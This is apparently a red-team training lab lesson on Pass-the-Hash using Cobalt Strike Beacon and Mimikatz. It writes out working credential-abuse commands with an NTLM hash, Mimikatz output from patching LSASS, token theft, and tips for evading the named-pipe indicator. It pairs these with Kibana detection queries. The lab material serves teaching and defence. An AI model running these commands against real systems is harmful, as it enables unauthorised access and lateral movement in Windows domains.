Pass the Hash is a technique that allows you to authenticate to a Windows service using the NTLM hash of a user's password, rather than the plaintext. It works by starting a new logon session with a fake identity and then replacing the session information with the domain, username and NTLM hash provided.

This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.

Beacon has a dedicated `pth` command which executes Mimikatz in the background.
```shell
> pth DEV\jking 4ffd3eabdce2e158d923ddec72de979e

user    : jking
domain    : DEV
program    : C:\Windows\system32\cmd.exe /c echo 1cbe909fe8a > \\.\pipe\16ca6d
impers.    : no
NTLM    : 4ffd3eabdce2e158d923ddec72de979e
  |  PID  5540
  |  TID  5976
  |  LSA Process is now R/W
  |  LUID 0 ; 4069467 (00000000:003e185b)
  \_ msv1-0   - data copy @ 0000024DC099D3D0 : OK !

   \_ rc4_hmac_nt       OK

   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 0000024DC14503D8 (32) -> null
```

It passes the token over a named pipe which Beacon then impersonates automatically.
```shell
beacon> ls \\srv-2\c$

Sysmon will record the process creation event for `cmd.exe` including the command line arguments `echo 1cbe909fe8a > \\.\pipe\16ca6d.` This unusual pattern can be searched for in Kibana:
```shell
event.module: sysmon and event.type: process_start and process.name: cmd.exe and process.command_line: *\\\\.\\pipe\\*
```

Pass-the-hash will also generate event `4624` with logon type 9.  This event records the executing user's Logon ID, which we can cross reference from the process creation event above.
```shell
event.code: 4624 and winlog.logon.id: 0xe6d64
```

The **TargetUserName** and **TargetOutboundUserName** tells us that **NT AUTHORITY\SYSTEM** has impersonated **jking**.

To avoid the `\\.\pipe\` indicator, we can execute Mimikatz manually and specify our own process.
```shell
beacon> mimikatz sekurlsa::pth /user:jking /domain:dev.cyberbotic.io /ntlm:4ffd3eabdce2e158d923ddec72de979e
```

If no `/run` parameter is specified, then `cmd.exe` is started.  However, this can actually cause the process window to appear on the users desktop.  This is less of a concern if you're running as `SYSTEM` without any desktop session associated with it, but has obvious implications otherwise.

Use a process that doesn't have a console or use `"powershell -w hidden"` to create a hidden window.

Then once the spawned process has started, impersonate it using `steal_token`.
```shell
beacon> steal_token 6284
[+] Impersonated NT AUTHORITY\SYSTEM
```

When finished, use `rev2self` and `kill` the spawned process.
```shell
beacon> rev2self
[*] Tasked beacon to revert token
[+] host called home, sent: 8 bytes

beacon> kill 6284
[*] Tasked beacon to kill 6284
[+] host called home, sent: 12 bytes
```

>Use both methods for executing pass-the-hash and find the evidence in Kibana.
